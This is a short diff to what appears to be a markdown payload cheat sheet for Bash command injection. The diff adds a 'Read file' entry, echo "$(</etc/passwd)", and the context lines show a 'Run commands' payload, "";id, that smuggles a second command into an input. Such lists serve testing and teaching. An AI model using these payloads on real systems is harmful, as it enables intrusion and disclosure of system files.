@@ -1,5 +1,10 @@
 ## Bash
 
+- Read file
+  ```
+  echo "$(</etc/passwd)"
+  ```
+
 - Run commands
   ```
   "";id
